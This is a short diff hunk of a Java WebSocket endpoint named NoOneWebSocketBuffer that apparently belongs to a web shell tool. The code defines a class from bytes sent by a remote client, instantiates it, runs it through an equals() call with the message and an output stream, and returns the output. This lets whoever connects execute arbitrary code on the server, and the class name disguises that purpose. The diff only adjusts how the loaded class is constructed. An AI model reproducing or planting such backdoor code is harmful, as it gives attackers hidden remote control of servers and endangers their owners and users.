@@ -32,9 +32,8 @@ public class NoOneWebSocketBuffer extends Endpoint implements MessageHandler.Who
                 coreClass = reflectionDefineClass(bytes);
             }
             ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-            Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
+            Object httpChannelCore = coreClass.newInstance();
             httpChannelCore.equals(new Object[]{msg, outputStream});
-            httpChannelCore.toString();
             byte[] result = outputStream.toByteArray();
             session.getBasicRemote().sendBinary(ByteBuffer.wrap(result));
         } catch (Throwable e) {
